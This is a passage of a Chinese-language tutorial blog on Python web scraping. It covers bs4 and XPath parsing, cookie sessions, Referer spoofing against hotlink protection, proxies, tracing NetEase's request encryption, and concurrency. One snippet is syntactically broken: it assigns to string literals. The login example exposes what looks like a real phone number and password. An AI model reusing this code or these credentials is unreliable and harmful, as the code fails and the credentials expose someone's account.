class="code"><pre><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br></pre></td></tr></table></figure><ul><li>一次筛选做不出来的就筛选两次！</li></ul><h4 id="bs4解析"><a href="#bs4解析" class="headerlink" title="bs4解析"></a>bs4解析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--结构--&gt;</span><br><span class="line">&lt;标签 属性=属性值&gt;被标记的内容&lt;/标签&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">bs4就是通过标签和属性来定位内容</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>bs4也需要安装： <code>pip install bs4</code></p><h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><h6 id="北京新发地爬取菜价"><a href="#北京新发地爬取菜价" class="headerlink" title="北京新发地爬取菜价"></a>北京新发地爬取菜价</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import csv</span><br><span class="line"></span><br><span class="line">url = &#x27;http://www.xinfadi.com.cn/index.html&#x27;</span><br><span class="line">resp = requests.get(url)</span><br><span class="line"></span><br><span class="line">f = open(&#x27;菜价.csv&#x27;,mode = &#x27;w&#x27;)</span><br><span class="line">csvwriter = csv.writer(f)</span><br><span class="line"></span><br><span class="line">#解析数据</span><br><span class="line"># 1.把页面源代码交给BeautifulSoup进行处理，生成bs对象</span><br><span class="line">page = BeautifulSoup(resp.text, &#x27;html.parser&#x27;) # 指定html解释器</span><br><span class="line"># 2.从bs对象中查找数据</span><br><span class="line"># find(标签， 属性=值)</span><br><span class="line"># find_all(标签， 属性=值)</span><br><span class="line"></span><br><span class="line"># table = page.find(&#x27;table&#x27;, class_ = &#x27;hp_table&#x27;)  #class是python的关键字，不能直接写class需要加一个 _</span><br><span class="line">table = page.find(&#x27;table&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;hp_table&#x27;&#125;)        #这样写也可以，就避免用class报错了</span><br><span class="line">#拿到所有数据行</span><br><span class="line">trs = table.find_all(&#x27;tr&#x27;)[1:]</span><br><span class="line">for tr in trs:  #每一行</span><br><span class="line">    tds = tr.find_all(&#x27;td&#x27;) #拿到行中的所有td</span><br><span class="line">    &#x27;name&#x27; = tds[0].text   # .text表示拿到被标签标记的内容</span><br><span class="line">    &#x27;low&#x27; = tds[1].text</span><br><span class="line">    &#x27;avg&#x27; = tds[2].text</span><br><span class="line">    &#x27;high&#x27; = tds[3].text</span><br><span class="line">    &#x27;gui&#x27; = tds[4].text</span><br><span class="line">    &#x27;kind&#x27; = tds[5].text</span><br><span class="line">    &#x27;date&#x27; = tds[6].text</span><br><span class="line">    csvwriter.writerow([name,low,avg,high,gui,kind,date])</span><br><span class="line">    f.close()</span><br><span class="line">    print(&#x27;over!&#x27;)</span><br></pre></td></tr></table></figure><h6 id="优美美图库图片"><a href="#优美美图库图片" class="headerlink" title="优美美图库图片"></a>优美美图库图片</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#爬取唯美图片</span><br><span class="line">#拿到主页面源码</span><br><span class="line">#提取到页面的图片链接 src</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://www.umeituku.com/weimeitupian/&#x27;</span><br><span class="line">resp = requests.get(url)</span><br><span class="line">page0 = BeautifulSoup(resp.content.decode(&#x27;utf-8&#x27;), &#x27;html.parser&#x27;)</span><br><span class="line">ul = page0.find(&#x27;div&#x27;, class_=&quot;TypeList&quot;)</span><br><span class="line"># print(ul)</span><br><span class="line">#找到所有的a标签</span><br><span class="line">imgs = ul.find_all(&#x27;img&#x27;)</span><br><span class="line"># print(imgs)</span><br><span class="line"># 找到所有的的src</span><br><span class="line">for img in imgs:</span><br><span class="line">    src = img.get(&#x27;src&#x27;)</span><br><span class="line">    # 下载图片</span><br><span class="line">    img_resp = requests.get(src)</span><br><span class="line">    txt = img_resp.content       #content是文件内容，也就是图片的所有字节，保存在一个文件里面就是图片了</span><br><span class="line">    img_name = src.split(&#x27;/&#x27;)[-1]  #用图片地址最后几位作为图片名</span><br><span class="line">    with open(&#x27;唯美图片/&#x27;+img_name, mode=&#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(txt)               #图片内容写入文件中</span><br><span class="line">    print(&#x27;over&#x27;+img_name)</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">print(&#x27;over!&#x27;)</span><br></pre></td></tr></table></figure><h4 id="xpath解析"><a href="#xpath解析" class="headerlink" title="xpath解析"></a>xpath解析</h4><p>Xpath是在XML文档中搜索内容的一门语言</p><p>html是xml的一个子集</p><p>需要安装 lxml模块 <code>pip install lxml</code></p><h6 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># xpath_1</span><br><span class="line">from lxml import etree</span><br><span class="line">xml = &#x27;&#x27;&#x27;</span><br><span class="line">&lt;book&gt;</span><br><span class="line">    &lt;id&gt;1&lt;/id&gt;</span><br><span class="line">    &lt;name&gt;野花遍地香&lt;/name&gt;</span><br><span class="line">    &lt;price&gt;1.23&lt;/price&gt;</span><br><span class="line">    &lt;nick&gt;臭豆腐&lt;/nick&gt;</span><br><span class="line">    &lt;author&gt;</span><br><span class="line">        &lt;nick id = &#x27;10086&#x27;&gt;周大强&lt;/nick&gt;</span><br><span class="line">        &lt;nick id = &#x27;10010&#x27;&gt;周芷若&lt;/nick&gt;</span><br><span class="line">        &lt;nick class = &#x27;joy&#x27;&gt;周杰伦&lt;/nick&gt;</span><br><span class="line">        &lt;nick class = &#x27;jolin&#x27;&gt;蔡依林&lt;/nick&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;nick&gt;热热热热1&lt;/nick&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;span&gt;</span><br><span class="line">            &lt;nick&gt;热热热热2&lt;/nick&gt;</span><br><span class="line">        &lt;/span&gt;</span><br><span class="line">    &lt;/author&gt;</span><br><span class="line"></span><br><span class="line">    &lt;partner&gt;</span><br><span class="line">        &lt;nick id=&#x27;ppc&#x27;&gt;胖胖陈&lt;/nick&gt;</span><br><span class="line">        &lt;nick id=&#x27;ppbc&#x27;&gt;胖胖不陈&lt;/nick&gt;</span><br><span class="line">    &lt;/partner&gt;  </span><br><span class="line">&lt;/book&gt;    </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">tree = etree.XML(xml)</span><br><span class="line">#result = tree.xpath(&quot;/book/name/text()&quot;) # / 表示层级关系，第一个/是根节点  ,text()表示拿节点后面的东西</span><br><span class="line"></span><br><span class="line">print(tree.xpath(&quot;/book/name/text()&quot;)) # [&#x27;野花遍地香&#x27;]</span><br><span class="line"></span><br><span class="line"># // 表示该级以及后代的nick都要</span><br><span class="line">print(tree.xpath(&quot;/book/author//nick/text()&quot;)) #[&#x27;周大强&#x27;, &#x27;周芷若&#x27;, &#x27;周杰伦&#x27;, &#x27;蔡依林&#x27;, &#x27;热热热热&#x27;]</span><br><span class="line"></span><br><span class="line"># * 通配符</span><br><span class="line">print(tree.xpath(&quot;/book/author/*/nick/text()&quot;))  # * 可以代表任意的标签</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># xpath_2</span><br><span class="line">from lxml import etree</span><br><span class="line">tree = etree.parse(&quot;b.html&quot;)</span><br><span class="line"></span><br><span class="line"># xpath顺序是从1开始的，li[1]指的是第一个li也就是百度</span><br><span class="line">result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)</span><br><span class="line">#  [@href=&#x27;dapao&#x27;]  跟bs4很像</span><br><span class="line">result = tree.xpath(&#x27;/html/body/ol/li/a[@href=&quot;dapao&quot;]/text()&#x27;)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"># 相对查找</span><br><span class="line">ol_li_list = tree.xpath(&#x27;/html/body/ol/li&#x27;)</span><br><span class="line">for li in ol_li_list:</span><br><span class="line">    result = li.xpath(&#x27;./a/text()&#x27;)  # ./相对查找</span><br><span class="line">    result1 = li.xpath(&#x27;./a/@href&#x27;)   # @表示属性</span><br><span class="line">    print(result1)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h6 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h6><p>抓取猪八戒网站信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#xpath_实战_猪八戒网</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">url = &#x27;https://beijing.zbj.com/search/service/?kw=saas&amp;r=2&#x27;</span><br><span class="line">resp = requests.get(url)</span><br><span class="line"># ans = &quot;&quot;.join(str(resp.text.encode()).split())</span><br><span class="line"># resps = ans.encode().decode()</span><br><span class="line"></span><br><span class="line">html = etree.HTML(resp.text)</span><br><span class="line">divs = html.xpath(&#x27;/html/body/div[2]/div/div/div[3]/div/div[4]/div[4]/div[1]/div&#x27;)</span><br><span class="line"># print(divs)</span><br><span class="line">for div in divs:</span><br><span class="line">    print(div.xpath(&quot;./div/div[3]/div[1]/span/text()&quot;))</span><br></pre></td></tr></table></figure><ul><li>主要就是绝对路径和相对路径写对</li></ul><h2 id="Requests-进阶"><a href="#Requests-进阶" class="headerlink" title="Requests 进阶"></a>Requests 进阶</h2><h3 id="处理cookie"><a href="#处理cookie" class="headerlink" title="处理cookie"></a>处理cookie</h3><p>登录小说网流程：</p><p>登录 -&gt; 得到cookie</p><p>带着cookie 去请求到书架的url -&gt; 获得书架上的内容</p><ul><li>必须把上面两个操作连起来</li><li>我们可以用session请求 -&gt; session可以认为是一连串请求，在这个过程中cookie不会丢失</li></ul><p>例：处理cookie登录小说网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#处理cookie登录cookie</span><br><span class="line">import requests</span><br><span class="line">#会话</span><br><span class="line">session = requests.session()</span><br><span class="line">data = &#123;</span><br><span class="line">        &#x27;loginNAme&#x27;: &#x27;18782910550&#x27;,</span><br><span class="line">        &#x27;password&#x27;: &#x27;123youzhi&#x27;</span><br><span class="line">&#125;</span><br><span class="line">#1.登录</span><br><span class="line">url = &#x27;https://user.17k.com/ck/user/login&#x27;</span><br><span class="line">resp = session.post(url, data=data)</span><br><span class="line"># print(resp.cookies)</span><br><span class="line">#拿书架上的书   用session不用requests，session是有记忆的</span><br><span class="line">resp1 = session.get(&#x27;找到的有用的url&#x27;)</span><br><span class="line">print(resp1.json())</span><br></pre></td></tr></table></figure><ul><li>seesion 本质上是第一次请求拿到cookie之后，把cookie保存下来，第二次请求的时候直接用第一次的cookie请求了</li><li>如果还是用requests也是可以的，只用手动加上从浏览器复制过来的cookie就可以了</li></ul><h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>开发者工具（F12）看到的代码是页面实时的真实代码，而页面源代码则不是最终的代码，而是还需要经过二次渲染的</p><h5 id="盗链"><a href="#盗链" class="headerlink" title="盗链"></a>盗链</h5><blockquote><p>盗链是指在自己的页面上展示一些并不在自己服务器上的一些内容， 获取别人的资源地址，绕过别人的资源展示页面，直接在自己的页面上向最终用户提供此内容。 一般被盗链的都是图片、 音乐、视频、软件等资源。通过盗链的手段可以减轻自己服务器的负担</p></blockquote><h5 id="防盗链的工作原理"><a href="#防盗链的工作原理" class="headerlink" title="防盗链的工作原理"></a><strong>防盗链的工作原理</strong></h5><blockquote><p>通过Refer或者签名，网站可以检测目标网页访问的来源网页，如果是资源文件，则可以追踪到显示他的网页地址 一旦检测到来源不是本站，即进行阻止或者返回指定的页面</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 1.拿到contID</span><br><span class="line"># 2.拿到videoStatus返回的json  -&gt; srcURL</span><br><span class="line"># 3.把srcURL里面的内容进行调整</span><br><span class="line"># 4.合成真实的视频地址，下载视频</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;https://www.pearvideo.com/video_1748549&#x27;</span><br><span class="line">contID = url.split(&#x27;_&#x27;)[-1]</span><br><span class="line">vedioStatusURL = &#x27;https://www.pearvideo.com/videoStatus.jsp?contId=1748549&amp;mrd=0.09049480874281857&#x27;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&#x27;,</span><br><span class="line">    # 防盗链:Referer(该请求的上一级)  必须合理</span><br><span class="line">    &#x27;Referer&#x27;: url</span><br><span class="line">&#125;</span><br><span class="line">resp = requests.get(vedioStatusURL,headers=headers)</span><br><span class="line">dic = resp.json()</span><br><span class="line">srcURL = dic[&#x27;videoInfo&#x27;][&#x27;videos&#x27;][&#x27;srcUrl&#x27;]</span><br><span class="line">systemTime = dic[&#x27;systemTime&#x27;]</span><br><span class="line">srcURL1 = srcURL.replace(systemTime, &#x27;cont-&#x27;+contID)</span><br><span class="line"># print(srcURL1)</span><br><span class="line"># 下载链接</span><br><span class="line">with open(&#x27;vedio/&#x27;+contID+&#x27;.mp4&#x27;, mode=&#x27;wb&#x27;) as f:       #要加后缀！</span><br><span class="line">    f.write(requests.get(srcURL1).content)</span><br><span class="line">f.close()</span><br><span class="line">print(&#x27;over!&#x27;)</span><br></pre></td></tr></table></figure><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">proxies = &#123;</span><br><span class="line">    &#x27;https&#x27;: &#x27;https://193.134.211.196:21609&#x27;     #代理ip要自己去找</span><br><span class="line">&#125;</span><br><span class="line">resp = requests.get(&#x27;https://www.baidu.com&#x27;, proxies=proxies)</span><br><span class="line">resp.encoding = &#x27;utf-8&#x27;</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure><h3 id="综合训练（wyy）"><a href="#综合训练（wyy）" class="headerlink" title="综合训练（wyy）"></a>综合训练（wyy）</h3><h5 id="爬取网易云热评"><a href="#爬取网易云热评" class="headerlink" title="爬取网易云热评"></a>爬取网易云热评</h5><ul><li>找到热评：</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230110232047495-1024x438.png" style="zoom:67%;" /><ul><li>找到未加密的参数-&gt;想办法把参数加密(用网易的加密方式) 【params，encSecKey】-&gt;请求网易拿到数据 解密 开发者工具 -&gt; 栈跟踪[找到网页渲染调用的(js)脚本，里面就有加密方式之类的]</li><li>点击栈跟踪，找到最上面的哪一个js脚本打开</li><li>默认会在最后send的代码也就是最后执行的代码那一行有高亮，打一个断点进行刷新调试</li><li>找到我们目标XHR的网页，发现此时params等信息已经被加密</li><li>就继续栈跟踪，找在改脚本执行之前的脚本里面找。直到找到params没有被加密的地方到已经加密的地方。这中间就实现了key的加密</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230111001434047-1024x829.png" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230111001456613-1024x664.png" style="zoom:67%;" /><ul><li>上面两张图就说明就是be3x这里实现的加密</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230111001952355.png" style="zoom:67%;" /><ul><li>i3x 的rid和ThreadID -》e3x的data 找到加密前的东西：</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230111004110413.png" style="zoom:67%;" /><ul><li>找加密方式 （dd）</li></ul><h2 id="提高爬虫效率"><a href="#提高爬虫效率" class="headerlink" title="提高爬虫效率"></a>提高爬虫效率</h2><p>选择多线程，多进程，协程等操作来完成异步爬虫</p><p><strong>概念辨析</strong></p><blockquote><p>一个在内存中运行的应用程序。每个进程都有自己独立的一块内存空间，一个进程可以有多个线程，比如在Windows系统中，一个运行的xx.exe就是一个<strong>进程</strong>。</p><p>进程中的一个执行任务（控制单元），负责当前进程中程序的执行。一个进程至少有一个线程，一个进程可以运行多个线程，多个<strong>线程</strong>可共享数据。</p></blockquote><p>线程：执行单位，程序运行的时候有一个主线程</p><p>进程：资源单位，每一个进程至少有一个线程</p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#先看看单线程</span><br><span class="line">def func():</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(&quot;func&quot;, i)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    func()</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(&quot;main&quot;, i)</span><br><span class="line"></span><br><span class="line">#  多线程  第一种写法</span><br><span class="line">from threading import Thread  #线程类</span><br><span class="line">def func():</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(&quot;func&quot;, i)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    t = Thread(target=func) #创建线程，并告诉新的线程，它负责的是 func</span><br><span class="line">    t.start()   #多线程状态为可以开始工作的状态，但是具体的执行时间由CPU决定</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(&quot;main&quot;, i)</span><br><span class="line"># 打印结果有些时候会出现两个一起打印了，‘mainfunc 27’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  多线程  第二种写法</span><br><span class="line">from threading import Thread </span><br><span class="line">class MyThread(Thread):</span><br><span class="line">    def run(self):  #固定写法</span><br><span class="line">        for i in range(1000):</span><br><span class="line">            print(&quot;子线程&quot;, i)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    t = MyThread()</span><br><span class="line">    # t.run()   #不行？这样就是方法的调用了，就变成单线程了</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(&quot;主线程&quot;, i)</span><br></pre></td></tr></table></figure><h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><p>一般情况下开辟多进程会比较浪费资源，不建议使用。只用稍微了解一下就可以 写法基本上和线程一样的！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(&quot;子进程&quot;, i)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    p = Process(target=func)</span><br><span class="line">    p.start()</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(&quot;主进程&quot;, i)</span><br></pre></td></tr></table></figure><h4 id="线程池和进程池"><a href="#线程池和进程池" class="headerlink" title="线程池和进程池"></a>线程池和进程池</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 线程池:一次性开辟一些线程，用户直接给线程池提交任务</span><br><span class="line"># 线程任务的调度交给线程池来完成</span><br><span class="line"></span><br><span class="line">from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line">def fn(name):</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        print(name, i)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    #创建线程池</span><br><span class="line">    with ThreadPoolExecutor(20) as t:</span><br><span class="line">        for i in range(100):</span><br><span class="line">            t.submit(fn, name=f&#x27;线程&#123;i&#125;&#x27;)</span><br><span class="line">    # 外面的程序会等待线程池中的任务全部执行完毕，才能继续执行</span><br><span class="line">    print(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line"># 线程94991线程96 993 &lt;- 会出现这样的数据</span><br></pre></td></tr></table></figure><h4 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h4><h6 id="阻塞状态"><a href="#阻塞状态" class="headerlink" title="阻塞状态"></a>阻塞状态</h6><ul><li>当程序处于阻塞状态的时候，CPU是不为我工作的</li><li><code>input()</code>，程序也是处于阻塞状态</li><li>一般情况下，当程序处于IO(input &amp; output)操作的时候，线程都会处于阻塞状态</li></ul><h6 id="协程-1"><a href="#协程-1" class="headerlink" title="协程"></a>协程</h6><p>当程序遇见IO操作的时候，可以选择性的切换到其他任务上</p><p>协程， 我们又称为<strong>微线程</strong>，协程它不像线程和进程那样，需要进行系统内核上的上下文切换，协程的上下文切换是由开发人员决定的。</p><blockquote><p>协程运行在线程之上，当一个协程执行完成后，可以选择主动让出，让另一个协程运行在当前线程之上。<strong>协程并没有增加线程数量，只是在线程的基础之上通过分时复用的方式运行多个协程</strong></p></blockquote><ul><li>在微观上，是一个任务一个任务进行切换，切换条件一般就是IO操作</li><li>宏观上，我们能看到的其实是多个任务在一起执行</li><li>也就是，多任务异步操作</li><li>注意上面这一切都是：在单线程的条件下</li></ul><h6 id="多任务异步协程"><a href="#多任务异步协程" class="headerlink" title="多任务异步协程"></a>多任务异步协程</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"># 先看看无协程</span><br><span class="line">import asyncio</span><br><span class="line"></span><br><span class="line">async def func():</span><br><span class="line">    print(&#x27;你好&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    g = func()  #此时的函数是异步协程函数，函数执行得到的是一个协程对象</span><br><span class="line">    asyncio.run(g)      #协程程序需要asyncio模块的支持</span><br><span class="line"></span><br><span class="line">#协程处理多个任务</span><br><span class="line">import asyncio</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">async def func1():</span><br><span class="line">    print(&#x27;你好1&#x27;)</span><br><span class="line">    # time.sleep(3) #当程序出现了同步操作的时候，异步就中断了</span><br><span class="line">    await asyncio.sleep(3) #这是异步操作的sleep</span><br><span class="line">    print(&#x27;你好1&#x27;)</span><br><span class="line"></span><br><span class="line">async def func2():</span><br><span class="line">    print(&#x27;你好2&#x27;)</span><br><span class="line">    # time.sleep(3)</span><br><span class="line">    await asyncio.sleep(3)</span><br><span class="line">    print(&#x27;你好2&#x27;)</span><br><span class="line"></span><br><span class="line">async def func3():</span><br><span class="line">    